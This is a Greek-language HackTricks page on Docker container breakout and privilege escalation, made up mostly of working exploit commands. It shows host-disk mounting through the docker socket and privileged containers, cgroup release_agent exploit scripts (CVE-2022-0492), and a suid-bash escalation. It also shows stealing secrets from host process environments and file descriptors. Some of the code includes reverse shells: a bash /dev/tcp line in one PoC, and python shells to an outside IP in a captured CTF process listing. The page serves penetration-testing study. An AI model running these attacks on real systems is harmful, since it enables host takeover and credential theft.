# Docker Breakout / Εscalation Προνομίων

{% hint style="success" %}
Μάθε & εξάσκησε το Hacking στο AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**Εκπαίδευση HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Μάθε & εξάσκησε το Hacking στο GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**Εκπαίδευση HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Υποστήριξε το HackTricks</summary>

* Ελέγξτε τα [**σχέδια συνδρομής**](https://github.com/sponsors/carlospolop)!
* **Εγγραφείτε** 💬 [**στην ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε κόλπα χάκερ κάνοντας υποβολή PRs** στα αποθετήρια [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}

<figure><img src="../../../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
Χρησιμοποιήστε το [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=docker-breakout-privilege-escalation) για να δημιουργήσετε εύκολα και να **αυτοματοποιήσετε ροές εργασίας** με τα πιο προηγμένα εργαλεία της κοινότητας.\
Αποκτήστε πρόσβαση σήμερα:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=docker-breakout-privilege-escalation" %}

## Αυτόματη Απαρίθμηση & Απόδραση

* [**linpeas**](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS): Μπορεί επίσης να **απαριθμήσει containers**
* [**CDK**](https://github.com/cdk-team/CDK#installationdelivery): Αυτό το εργαλείο είναι αρκετά **χρήσιμο για την απαρίθμηση του container στο οποίο βρίσκεστε και ακόμα να προσπαθήσετε να αποδράσετε αυτόματα**
* [**amicontained**](https://github.com/genuinetools/amicontained): Χρήσιμο εργαλείο για να πάρετε τα προνόμια που έχει το container προκειμένου να βρείτε τρόπους απόδρασης από αυτό
* [**deepce**](https://github.com/stealthcopter/deepce): Εργαλείο για απαρίθμηση και απόδραση από containers
* [**grype**](https://github.com/anchore/grype): Πάρτε τα CVEs που περιέχονται στο λογισμικό που είναι εγκατεστημένο στην εικόνα

## Απόδραση με Ένωση του Docker Socket

Αν κάπως βρείτε ότι το **docker socket είναι συνδεδεμένο** μέσα στο docker container, θα μπορείτε να αποδράσετε από αυτό.\
Αυτό συμβαίνει συνήθως σε docker containers που για κάποιο λόγο χρειάζεται να συνδεθεί στον docker daemon για να εκτελέσει ενέργειες.
```bash
#Search the socket
find / -name docker.sock 2>/dev/null
#It's usually in /run/docker.sock
```
Σε αυτήν την περίπτωση μπορείτε να χρησιμοποιήσετε τα κανονικά εντολές docker για να επικοινωνήσετε με τον docker daemon:
```bash
#List images to use one
docker images
#Run the image mounting the host disk and chroot on it
docker run -it -v /:/host/ ubuntu:18.04 chroot /host/ bash

# Get full access to the host via ns pid and nsenter cli
docker run -it --rm --pid=host --privileged ubuntu bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash

# Get full privs in container without --privileged
docker run -it -v /:/host/ --cap-add=ALL --security-opt apparmor=unconfined --security-opt seccomp=unconfined --security-opt label:disable --pid=host --userns=host --uts=host --cgroupns=host ubuntu chroot /host/ bash
```
{% hint style="info" %}
Σε περίπτωση που το **docker socket βρίσκεται σε μη αναμενόμενη θέση** μπορείτε ακόμα να επικοινωνήσετε μαζί του χρησιμοποιώντας την εντολή **`docker`** με την παράμετρο **`-H unix:///path/to/docker.sock`**
{% endhint %}

Το Docker daemon ενδέχεται επίσης να [ακούει σε ένα θύρα (προεπιλεγμένα 2375, 2376)](../../../../network-services-pentesting/2375-pentesting-docker.md) ή σε συστήματα βασισμένα σε Systemd, η επικοινωνία με το Docker daemon μπορεί να γίνει μέσω του Systemd socket `fd://`.

{% hint style="info" %}
Επιπλέον, προσέξτε τα sockets εκτέλεσης άλλων υψηλού επιπέδου εκτελέσεων:

* dockershim: `unix:///var/run/dockershim.sock`
* containerd: `unix:///run/containerd/containerd.sock`
* cri-o: `unix:///var/run/crio/crio.sock`
* frakti: `unix:///var/run/frakti.sock`
* rktlet: `unix:///var/run/rktlet.sock`
* ...
{% endhint %}

## Απόδραση Κατάχρησης Δυνατοτήτων

Θα πρέπει να ελέγξετε τις δυνατότητες του container, αν έχει οποιαδήποτε από τις παρακάτω, ενδέχεται να μπορείτε να δραπετεύσετε από αυτό: **`CAP_SYS_ADMIN`**_,_ **`CAP_SYS_PTRACE`**, **`CAP_SYS_MODULE`**, **`DAC_READ_SEARCH`**, **`DAC_OVERRIDE, CAP_SYS_RAWIO`, `CAP_SYSLOG`, `CAP_NET_RAW`, `CAP_NET_ADMIN`**

Μπορείτε να ελέγξετε τις τρέχουσες δυνατότητες του container χρησιμοποιώντας τα **προαναφερθέντα αυτόματα εργαλεία** ή:
```bash
capsh --print
```
Στην ακόλουθη σελίδα μπορείτε **να μάθετε περισσότερα σχετικά με τις δυνατότητες του Linux** και πώς να τις καταχραστείτε για να δραπετεύσετε/αναβαθμίσετε προνομιακά δικαιώματα:

{% content-ref url="../../linux-capabilities.md" %}
[linux-capabilities.md](../../linux-capabilities.md)
{% endcontent-ref %}

## Δραπέτευση από Προνομιούχους Ελέγχους

Ένα προνομιούχος ελεγκτής μπορεί να δημιουργηθεί με τη σημαία `--privileged` ή απενεργοποιώντας συγκεκριμένες αμυντικές μέτρησεις:

* `--cap-add=ALL`
* `--security-opt apparmor=unconfined`
* `--security-opt seccomp=unconfined`
* `--security-opt label:disable`
* `--pid=host`
* `--userns=host`
* `--uts=host`
* `--cgroupns=host`
* `Mount /dev`

Η σημαία `--privileged` μειώνει σημαντικά την ασφάλεια του container, προσφέροντας **απεριόριστη πρόσβαση σε συσκευές** και παρακάμπτοντας **πολλές προστασίες**. Για λεπτομερή ανάλυση, ανατρέξτε στην τεκμηρίωση για τις πλήρεις επιπτώσεις της `--privileged`.

{% content-ref url="../docker-privileged.md" %}
[docker-privileged.md](../docker-privileged.md)
{% endcontent-ref %}

### Προνομιούχος + hostPID

Με αυτές τις άδειες μπορείτε απλά **να μεταβείτε στο namespace ενός διεργασίας που εκτελείται στον κεντρικό υπολογιστή ως ριζοχρήστης** όπως το init (pid:1) απλά εκτελώντας: `nsenter --target 1 --mount --uts --ipc --net --pid -- bash`

Δοκιμάστε το σε ένα container εκτελώντας:
```bash
docker run --rm -it --pid=host --privileged ubuntu bash
```
### Προνομιούχος

Απλά με τη σημαία προνομίων μπορείτε να δοκιμάσετε να **έχετε πρόσβαση στο δίσκο του υπολογιστή** ή να **δραπετεύσετε καταχρώμενοι το release\_agent ή άλλες διαφυγές**.

Δοκιμάστε τις παρακάτω παρακάμψεις σε ένα container εκτελώντας:
```bash
docker run --rm -it --privileged ubuntu bash
```
#### Προσάρτηση Δίσκου - Poc1

Οι ρυθμισμένες σωστά docker containers δεν θα επιτρέψουν εντολές όπως **fdisk -l**. Ωστόσο, σε docker εντολές που έχουν ρυθμιστεί λανθασμένα όπου ορίζεται η σημαία `--privileged` ή `--device=/dev/sda1` με κεφαλαία γράμματα, είναι δυνατόν να αποκτηθούν δικαιώματα για να δείτε τον δίσκο του κεντρικού υπολογιστή.

![](https://bestestredteam.com/content/images/2019/08/image-16.png)

Έτσι, για να πάρετε τον έλεγχο του κεντρικού υπολογιστή, είναι ασήμαντο:
```bash
mkdir -p /mnt/hola
mount /dev/sda1 /mnt/hola
```
Και ορίστε! Τώρα μπορείτε να έχετε πρόσβαση στο σύστημα αρχείων του κεντρικού υπολογιστή επειδή είναι προσαρτημένο στον φάκελο `/mnt/hola`.

#### Προσάρτηση Δίσκου - Poc2

Μέσα στο container, ένας επιτιθέμενος μπορεί να προσπαθήσει να κερδίσει περαιτέρω πρόσβαση στο υποκείμενο λειτουργικό σύστημα του κεντρικού υπολογιστή μέσω ενός εγγράψιμου όγκου hostPath που δημιουργήθηκε από το cluster. Παρακάτω είναι μερικά κοινά πράγματα που μπορείτε να ελέγξετε μέσα στο container για να δείτε αν μπορείτε να εκμεταλλευτείτε αυτό το διάνυσμα του επιτιθέμενου:
```bash
### Check if You Can Write to a File-system
echo 1 > /proc/sysrq-trigger

### Check root UUID
cat /proc/cmdline
BOOT_IMAGE=/boot/vmlinuz-4.4.0-197-generic root=UUID=b2e62f4f-d338-470e-9ae7-4fc0e014858c ro console=tty1 console=ttyS0 earlyprintk=ttyS0 rootdelay=300

# Check Underlying Host Filesystem
findfs UUID=<UUID Value>
/dev/sda1

# Attempt to Mount the Host's Filesystem
mkdir /mnt-test
mount /dev/sda1 /mnt-test
mount: /mnt: permission denied. ---> Failed! but if not, you may have access to the underlying host OS file-system now.

### debugfs (Interactive File System Debugger)
debugfs /dev/sda1
```
#### Εκμετάλλευση Προνομιούχης Απόδρασης Χρησιμοποιώντας τον υπάρχοντα release\_agent ([cve-2022-0492](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)) - PoC1

{% code title="Αρχικό PoC" %}
```bash
# spawn a new container to exploit via:
# docker run --rm -it --privileged ubuntu bash

# Finds + enables a cgroup release_agent
# Looks for something like: /sys/fs/cgroup/*/release_agent
d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
# If "d" is empty, this won't work, you need to use the next PoC

# Enables notify_on_release in the cgroup
mkdir -p $d/w;
echo 1 >$d/w/notify_on_release
# If you have a "Read-only file system" error, you need to use the next PoC

# Finds path of OverlayFS mount for container
# Unless the configuration explicitly exposes the mount point of the host filesystem
# see https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html
t=`sed -n 's/overlay \/ .*\perdir=\([^,]*\).*/\1/p' /etc/mtab`

# Sets release_agent to /path/payload
touch /o; echo $t/c > $d/release_agent

# Creates a payload
echo "#!/bin/sh" > /c
echo "ps > $t/o" >> /c
chmod +x /c

# Triggers the cgroup via empty cgroup.procs
sh -c "echo 0 > $d/w/cgroup.procs"; sleep 1

# Reads the output
cat /o
```
{% endcode %}

#### Απόδραση με προνομιούχο χρήστη εκμεταλλευόμενος τον δημιουργημένο release_agent ([cve-2022-0492](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)) - PoC2

{% code title="Δεύτερο PoC" %}
```bash
# On the host
docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash

# Mounts the RDMA cgroup controller and create a child cgroup
# This technique should work with the majority of cgroup controllers
# If you're following along and get "mount: /tmp/cgrp: special device cgroup does not exist"
# It's because your setup doesn't have the RDMA cgroup controller, try change rdma to memory to fix it
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
# If mount gives an error, this won't work, you need to use the first PoC

# Enables cgroup notifications on release of the "x" cgroup
echo 1 > /tmp/cgrp/x/notify_on_release

# Finds path of OverlayFS mount for container
# Unless the configuration explicitly exposes the mount point of the host filesystem
# see https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`

# Sets release_agent to /path/payload
echo "$host_path/cmd" > /tmp/cgrp/release_agent

#For a normal PoC =================
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
#===================================
#Reverse shell
echo '#!/bin/bash' > /cmd
echo "bash -i >& /dev/tcp/172.17.0.1/9000 0>&1" >> /cmd
chmod a+x /cmd
#===================================

# Executes the attack by spawning a process that immediately ends inside the "x" child cgroup
# By creating a /bin/sh process and writing its PID to the cgroup.procs file in "x" child cgroup directory
# The script on the host will execute after /bin/sh exits
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"

# Reads the output
cat /output
```
{% endcode %}

Βρείτε μια **εξήγηση της τεχνικής** στο:

{% content-ref url="docker-release_agent-cgroups-escape.md" %}
[docker-release\_agent-cgroups-escape.md](docker-release\_agent-cgroups-escape.md)
{% endcontent-ref %}

#### Απόδραση με Προνομιούχο Κατάχρηση του release\_agent χωρίς να γνωρίζετε τη σχετική διαδρομή - PoC3

Στις προηγούμενες εκμεταλλεύσεις, η **απόλυτη διαδρομή του container μέσα στο σύστημα αρχείων των hosts αποκαλύπτεται**. Ωστόσο, αυτό δεν συμβαίνει πάντα. Σε περιπτώσεις όπου **δεν γνωρίζετε την απόλυτη διαδρομή του container μέσα στον host** μπορείτε να χρησιμοποιήσετε αυτήν την τεχνική:

{% content-ref url="release_agent-exploit-relative-paths-to-pids.md" %}
[release\_agent-exploit-relative-paths-to-pids.md](release\_agent-exploit-relative-paths-to-pids.md)
{% endcontent-ref %}
```bash
#!/bin/sh

OUTPUT_DIR="/"
MAX_PID=65535
CGROUP_NAME="xyx"
CGROUP_MOUNT="/tmp/cgrp"
PAYLOAD_NAME="${CGROUP_NAME}_payload.sh"
PAYLOAD_PATH="${OUTPUT_DIR}/${PAYLOAD_NAME}"
OUTPUT_NAME="${CGROUP_NAME}_payload.out"
OUTPUT_PATH="${OUTPUT_DIR}/${OUTPUT_NAME}"

# Run a process for which we can search for (not needed in reality, but nice to have)
sleep 10000 &

# Prepare the payload script to execute on the host
cat > ${PAYLOAD_PATH} << __EOF__
#!/bin/sh

OUTPATH=\$(dirname \$0)/${OUTPUT_NAME}

# Commands to run on the host<
ps -eaf > \${OUTPATH} 2>&1
__EOF__

# Make the payload script executable
chmod a+x ${PAYLOAD_PATH}

# Set up the cgroup mount using the memory resource cgroup controller
mkdir ${CGROUP_MOUNT}
mount -t cgroup -o memory cgroup ${CGROUP_MOUNT}
mkdir ${CGROUP_MOUNT}/${CGROUP_NAME}
echo 1 > ${CGROUP_MOUNT}/${CGROUP_NAME}/notify_on_release

# Brute force the host pid until the output path is created, or we run out of guesses
TPID=1
while [ ! -f ${OUTPUT_PATH} ]
do
if [ $((${TPID} % 100)) -eq 0 ]
then
echo "Checking pid ${TPID}"
if [ ${TPID} -gt ${MAX_PID} ]
then
echo "Exiting at ${MAX_PID} :-("
exit 1
fi
fi
# Set the release_agent path to the guessed pid
echo "/proc/${TPID}/root${PAYLOAD_PATH}" > ${CGROUP_MOUNT}/release_agent
# Trigger execution of the release_agent
sh -c "echo \$\$ > ${CGROUP_MOUNT}/${CGROUP_NAME}/cgroup.procs"
TPID=$((${TPID} + 1))
done

# Wait for and cat the output
sleep 1
echo "Done! Output:"
cat ${OUTPUT_PATH}
```
Η εκτέλεση του PoC εντός ενός προνομιούχου container θα πρέπει να παρέχει έξοδο παρόμοια με:
```bash
root@container:~$ ./release_agent_pid_brute.sh
Checking pid 100
Checking pid 200
Checking pid 300
Checking pid 400
Checking pid 500
Checking pid 600
Checking pid 700
Checking pid 800
Checking pid 900
Checking pid 1000
Checking pid 1100
Checking pid 1200

Done! Output:
UID        PID  PPID  C STIME TTY          TIME CMD
root         1     0  0 11:25 ?        00:00:01 /sbin/init
root         2     0  0 11:25 ?        00:00:00 [kthreadd]
root         3     2  0 11:25 ?        00:00:00 [rcu_gp]
root         4     2  0 11:25 ?        00:00:00 [rcu_par_gp]
root         5     2  0 11:25 ?        00:00:00 [kworker/0:0-events]
root         6     2  0 11:25 ?        00:00:00 [kworker/0:0H-kblockd]
root         9     2  0 11:25 ?        00:00:00 [mm_percpu_wq]
root        10     2  0 11:25 ?        00:00:00 [ksoftirqd/0]
...
```
#### Απόδραση με Χρήση Ευαίσθητων Σημείων Πρόσβασης

Υπάρχουν αρκετά αρχεία που μπορεί να τοποθετηθούν και δίνουν **πληροφορίες σχετικά με τον υποκείμενο κεντρικό υπολογιστή**. Κάποια από αυτά μπορεί ακόμα να υποδεικνύουν **κάτι που πρέπει να εκτελεστεί από τον κεντρικό υπολογιστή όταν συμβεί κάτι** (το οποίο θα επιτρέψει σε έναν επιτιθέμενο να δραπετεύσει από τον εμπλεκόμενο δοχείο).\
Η κατάχρηση αυτών των αρχείων μπορεί να επιτρέψει:

* release\_agent (ήδη καλυμμένο προηγουμένως)
* [binfmt\_misc](sensitive-mounts.md#proc-sys-fs-binfmt\_misc)
* [core\_pattern](sensitive-mounts.md#proc-sys-kernel-core\_pattern)
* [uevent\_helper](sensitive-mounts.md#sys-kernel-uevent\_helper)
* [modprobe](sensitive-mounts.md#proc-sys-kernel-modprobe)

Ωστόσο, μπορείτε να βρείτε **άλλα ευαίσθητα αρχεία** για έλεγχο σε αυτήν τη σελίδα:

{% content-ref url="sensitive-mounts.md" %}
[sensitive-mounts.md](sensitive-mounts.md)
{% endcontent-ref %}

### Αυθαίρετα Σημεία Πρόσβασης

Σε πολλές περιπτώσεις θα διαπιστώσετε ότι το **δοχείο έχει κάποιον όγκο τοποθετημένο από τον κεντρικό υπολογιστή**. Εάν αυτός ο όγκος δεν έχει ρυθμιστεί σωστά, ενδέχεται να μπορείτε να **έχετε πρόσβαση/τροποποιήσετε ευαίσθητα δεδομένα**: Διαβάστε μυστικά, αλλάξτε τα authorized\_keys του ssh...
```bash
docker run --rm -it -v /:/host ubuntu bash
```
### Εscalation προνομίων με 2 κελύφη και host mount

Εάν έχετε πρόσβαση ως **root μέσα σε ένα container** που έχει κάποιο φάκελο από τον host που έχει προσαρτηθεί και έχετε **δραπετεύσει ως μη προνομιούχος χρήστης στον host** και έχετε πρόσβαση ανάγνωσης στον προσαρτημένο φάκελο.\
Μπορείτε να δημιουργήσετε ένα **αρχείο bash suid** στον **προσαρτημένο φάκελο** μέσα στο **container** και να το **εκτελέσετε από τον host** για προνομιούχο ανέλιξη.
```bash
cp /bin/bash . #From non priv inside mounted folder
# You need to copy it from the host as the bash binaries might be diferent in the host and in the container
chown root:root bash #From container as root inside mounted folder
chmod 4777 bash #From container as root inside mounted folder
bash -p #From non priv inside mounted folder
```
### Εscalation προνομίων με 2 κελύφη

Εάν έχετε πρόσβαση ως **root μέσα σε ένα container** και έχετε **δραπετεύσει ως μη προνομιούχος χρήστης στον host**, μπορείτε να καταχραστείτε και τα δύο κελύφη για **εξέλιξη προνομίων μέσα στον host** αν έχετε τη δυνατότητα MKNOD μέσα στο container (είναι εξ' ορισμού) όπως [**εξηγείται σε αυτή την ανάρτηση**](https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/).\
Με αυτή τη δυνατότητα, ο χρήστης root μέσα στο container επιτρέπεται να **δημιουργεί αρχεία block device**. Τα αρχεία συσκευών είναι ειδικά αρχεία που χρησιμοποιούνται για **πρόσβαση στο υποκείμενο hardware & στα modules του πυρήνα**. Για παράδειγμα, το αρχείο block device /dev/sda δίνει πρόσβαση για **ανάγνωση των raw δεδομένων στο δίσκο του συστήματος**.

Το Docker προστατεύει ενάντια στην κατάχρηση αρχείων block device μέσα σε containers επιβάλλοντας μια πολιτική cgroup που **αποκλείει τις λειτουργίες ανάγνωσης/εγγραφής block device**. Ωστόσο, εάν ένα αρχείο block device **δημιουργηθεί μέσα στο container**, γίνεται προσβάσιμο από έξω από το container μέσω του φακέλου **/proc/PID/root/**. Αυτή η πρόσβαση απαιτεί τον **ίδιο ιδιοκτήτη διεργασίας** τόσο μέσα όσο και έξω από το container.

Παράδειγμα **εκμετάλλευσης** από αυτό το [**άρθρο**](https://radboudinstituteof.pwning.nl/posts/htbunictfquals2021/goodgames/):
```bash
# On the container as root
cd /
# Crate device
mknod sda b 8 0
# Give access to it
chmod 777 sda

# Create the nonepriv user of the host inside the container
## In this case it's called augustus (like the user from the host)
echo "augustus:x:1000:1000:augustus,,,:/home/augustus:/bin/bash" >> /etc/passwd
# Get a shell as augustus inside the container
su augustus
su: Authentication failure
(Ignored)
augustus@3a453ab39d3d:/backend$ /bin/sh
/bin/sh
$
```

```bash
# On the host

# get the real PID of the shell inside the container as the new https://app.gitbook.com/s/-L_2uGJGU7AVNRcqRvEi/~/changes/3847/linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation#privilege-escalation-with-2-shells user
augustus@GoodGames:~$ ps -auxf | grep /bin/sh
root      1496  0.0  0.0   4292   744 ?        S    09:30   0:00      \_ /bin/sh -c python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.12",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
root      1627  0.0  0.0   4292   756 ?        S    09:44   0:00      \_ /bin/sh -c python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.12",4445));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
augustus  1659  0.0  0.0   4292   712 ?        S+   09:48   0:00                          \_ /bin/sh
augustus  1661  0.0  0.0   6116   648 pts/0    S+   09:48   0:00              \_ grep /bin/sh

# The process ID is 1659 in this case
# Grep for the sda for HTB{ through the process:
augustus@GoodGames:~$ grep -a 'HTB{' /proc/1659/root/sda
HTB{7h4T_w45_Tr1cKy_1_D4r3_54y}
```
### hostPID

Εάν μπορείτε να έχετε πρόσβαση στις διεργασίες του κεντρικού υπολογιστή, τότε θα μπορείτε να έχετε πρόσβαση σε πολλές ευαίσθητες πληροφορίες που αποθηκεύονται σε αυτές τις διεργασίες. Εκτελέστε το εργαστήριο δοκιμών:
```
docker run --rm -it --pid=host ubuntu bash
```
Για παράδειγμα, θα μπορείτε να εμφανίσετε τις διεργασίες χρησιμοποιώντας κάτι σαν `ps auxn` και να αναζητήσετε ευαίσθητες λεπτομέρειες στις εντολές.

Στη συνέχεια, καθώς μπορείτε **να έχετε πρόσβαση σε κάθε διεργασία του κεντρικού υπολογιστή στο /proc/, μπορείτε απλά να κλέψετε τα μυστικά περιβάλλοντός τους** εκτελώντας:
```bash
for e in `ls /proc/*/environ`; do echo; echo $e; xargs -0 -L1 -a $e; done
/proc/988058/environ
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
HOSTNAME=argocd-server-69678b4f65-6mmql
USER=abrgocd
...
```
Μπορείτε επίσης **να έχετε πρόσβαση στους αριθμούς αρχείων άλλων διεργασιών και να διαβάσετε τα ανοικτά αρχεία τους**:
```bash
for fd in `find /proc/*/fd`; do ls -al $fd/* 2>/dev/null | grep \>; done > fds.txt
less fds.txt
...omitted for brevity...
lrwx------ 1 root root 64 Jun 15 02:25 /proc/635813/fd/2 -> /dev/pts/0
lrwx------ 1 root root 64 Jun 15 02:25 /proc/635813/fd/4 -> /.secret.txt.swp
# You can open the secret filw with:
cat /proc/635813/fd/4
```
Μπορείτε επίσης **να τερματίσετε διεργασίες και να προκαλέσετε DoS**.

{% hint style="warning" %}
Αν έχετε κάποια προνομιακή **πρόσβαση σε μια διεργασία έξω από το container**, μπορείτε να εκτελέσετε κάτι σαν `nsenter --target <pid> --all` ή `nsenter --target <pid> --mount --net --pid --cgroup` για **να εκτελέσετε ένα κέλυφος με τους ίδιους περιορισμούς ns** (ελπίζουμε κανέναν) **όπως αυτή η διεργασία.**
{% endhint %}

### hostNetwork
```
docker run --rm -it --network=host ubuntu bash
```
Εάν ένας container έχει διαμορφωθεί με τον [host networking driver (`--network=host`)](https://docs.docker.com/network/host/), το δίκτυο αυτού του container δεν είναι απομονωμένο από τον Docker host (το container μοιράζεται το namespace δικτύωσης του host) και το container δεν λαμβάνει ανατεθειμένη δική του διεύθυνση IP. Με άλλα λόγια, το **container δένει όλες τις υπηρεσίες απευθείας στη διεύθυνση IP του host**. Επιπλέον, το container μπορεί **να παρακολουθήσει ΟΛΗ την κίνηση δικτύου που ο host** στέλνει και λαμβάνει στην κοινόχρηστη διεπαφή `tcpdump -i eth0`.

Για παράδειγμα, μπορείτε να χρησιμοποιήσετε αυτό για **να καταγράψετε και ακόμα να παραποιήσετε την κίνηση** μεταξύ του host και της μεταδεδομένης περίπτωσης.

Όπως στα παρακάτω παραδείγματα:

* [Ανάλυση: Πώς να επικοινωνήσετε με το Google SRE: Ρίχνοντας ένα κέλυφος στο cloud SQL](https://offensi.com/2020/08/18/how-to-contact-google-sre-dropping-a-shell-in-cloud-sql/)
* [Η υπηρεσία Metadata MITM επιτρέπει την ανάδειξη προνομίων ρίζας (EKS / GKE)](https://blog.champtar.fr/Metadata\_MITM\_root\_EKS\_GKE/)

Θα έχετε επίσης πρόσβαση σε **υπηρεσίες δικτύου που είναι δεμένες στο localhost** μέσα στον host ή ακόμα και πρόσβαση στα **δικαιώματα μεταδεδομένων του κόμβου** (τα οποία ενδέχεται να είναι διαφορετικά από αυτά που μπορεί να έχει πρόσβαση ένα container).

### hostIPC
```bash
docker run --rm -it --ipc=host ubuntu bash
```
Με το `hostIPC=true`, κερδίζετε πρόσβαση στους πόρους μεταξύ διεργασιών (IPC) του κεντρικού υπολογιστή, όπως τη **κοινόχρηστη μνήμη** στο `/dev/shm`. Αυτό επιτρέπει την ανάγνωση/εγγραφή όπου οι ίδιοι πόροι IPC χρησιμοποιούνται από άλλες διεργασίες του κεντρικού υπολογιστή ή των pods. Χρησιμοποιήστε την εντολή `ipcs` για να εξετάσετε αυτούς τους μηχανισμούς IPC περαιτέρω.

* **Επιθεώρηση του /dev/shm** - Αναζητήστε αρχεία σε αυτήν την τοποθεσία της κοινόχρηστης μνήμης: `ls -la /dev/shm`
* **Επιθεώρηση υπαρχόντων εγκαταστάσεων IPC** - Μπορείτε να ελέγξετε αν χρησιμοποιούνται κάποιες εγκαταστάσεις IPC με το `/usr/bin/ipcs`. Ελέγξτε το με: `ipcs -a`

### Ανάκτηση δυνατοτήτων

Αν η κλήση συστήματος **`unshare`** δεν έχει απαγορευτεί, μπορείτε να ανακτήσετε όλες τις δυνατότητες εκτελώντας:
```bash
unshare -UrmCpf bash
# Check them with
cat /proc/self/status | grep CapEff
```
### Κατάχρηση του περιβάλλοντος χρήστη μέσω συμβολικών συνδέσεων

Η δεύτερη τεχνική που εξηγείται στη δημοσίευση [https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/](https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/) δείχνει πώς μπορείτε να καταχραστείτε τα bind mounts με χώρους ονομάτων χρηστών, για να επηρεάσετε αρχεία μέσα στον κεντρικό υπολογιστή (σε εκείνη τη συγκεκριμένη περίπτωση, διαγράψτε αρχεία).

<figure><img src="../../../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

Χρησιμοποιήστε το [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=docker-breakout-privilege-escalation) για να δημιουργήσετε εύκολα και να **αυτοματοποιήσετε ροές εργασίας** με τη χρήση των πιο προηγμένων εργαλείων της κοινότητας.\
Αποκτήστε πρόσβαση σήμερα:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=docker-breakout-privilege-escalation" %}

## CVEs

### Εκμετάλλευση Runc (CVE-2019-5736)

Σε περίπτωση που μπορείτε να εκτελέσετε την εντολή `docker exec` ως ριζοχρήστης (πιθανόν με sudo), μπορείτε να προσπαθήσετε να αναβαθμίσετε τα δικαιώματά σας δραπετεύοντας από ένα container καταχρηστικά το CVE-2019-5736 (εκμετάλλευση [εδώ](https://github.com/Frichetten/CVE-2019-5736-PoC/blob/master/main.go)). Αυτή η τεχνική θα **αντικαταστήσει** ουσιαστικά το _**/bin/sh**_ δυαδικό αρχείο του **κεντρικού υπολογιστή** **από ένα container**, έτσι ώστε οποιοσδήποτε εκτελεί την εντολή docker exec μπορεί να ενεργοποιήσει το φορτίο.

Αλλάξτε το φορτίο αναλόγως και δημιουργήστε το main.go με την εντολή `go build main.go`. Το δυαδικό αρχείο που προκύπτει θα πρέπει να τοποθετηθεί στο container Docker για εκτέλεση.\
Κατά την εκτέλεση, μόλις εμφανιστεί το μήνυμα `[+] Overwritten /bin/sh successfully` πρέπει να εκτελέσετε το ακόλουθο από τον κεντρικό υπολογιστή:

`docker exec -it <container-name> /bin/sh`

Αυτό θα ενεργοποιήσει το φορτίο που υπάρχει στο αρχείο main.go.

Για περισσότερες πληροφορίες: [https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html](https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html)

{% hint style="info" %}
Υπάρχουν και άλλα CVEs στα οποία το container μπορεί να είναι ευάλωτο, μπορείτε να βρείτε μια λίστα στο [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/cve-list](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/cve-list)
{% endhint %}

## Προσαρμοσμένη Διαφυγή Docker

### Επιφάνεια Διαφυγής Docker

* **Χώροι ονομάτων:** Η διαδικασία πρέπει να είναι **εντελώς χωρισμένη από άλλες διαδικασίες** μέσω χώρων ονομάτων, έτσι ώστε να μην μπορούμε να δραπετεύσουμε αλληλεπιδρώντας με άλλες διεργασίες λόγω χώρων ονομάτων (από προεπιλογή δεν μπορούν να επικοινωνήσουν μέσω IPCs, unix sockets, network svcs, D-Bus, `/proc` άλλων διεργασιών).
* **Χρήστης ρίζας**: Από προεπιλογή, ο χρήστης που εκτελεί τη διαδικασία είναι ο χρήστης ρίζας (όμως οι προνομιούχες του είναι περιορισμένες).
